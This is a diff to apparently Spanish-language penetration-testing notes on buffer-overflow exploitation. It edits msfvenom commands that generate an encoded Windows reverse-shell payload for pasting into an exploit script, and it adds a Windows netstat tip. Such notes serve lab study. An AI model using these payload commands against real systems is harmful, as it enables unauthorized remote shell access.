@@ -254,10 +254,10 @@ if __name__ == "__main__":
 
 * Utilizamos msfvenom para crear el codigo
 
-  `msfvenom -p windows/shell_reverse_tcp LHOST=<ip de victima> LPORT=443 -a x86 --platform windows -b <badchars> -e x86/shikata_ga_nai -f c`
+  `msfvenom -p windows/shell_reverse_tcp LHOST=<ip de victima> LPORT=443 -a x86 --platform windows -b <badchars> -e x86/shikata_ga_nai -f c EXITFUNC=thread`
 
   Ej:
-  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.15 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c`
+  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.15 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread`
 
 * Añadimos el codigo al script.py
 
@@ -480,3 +480,7 @@ if __name__ == "__main__":
 Linux:
 * `service opensnitch stop` --> evitar problemas con el --min-rate de nmap
 * `lsof -i:8888` --> listar servicio en el puerto 8888
+
+Windows:
+
+* `netstat -nat` --> listar servicios en windows
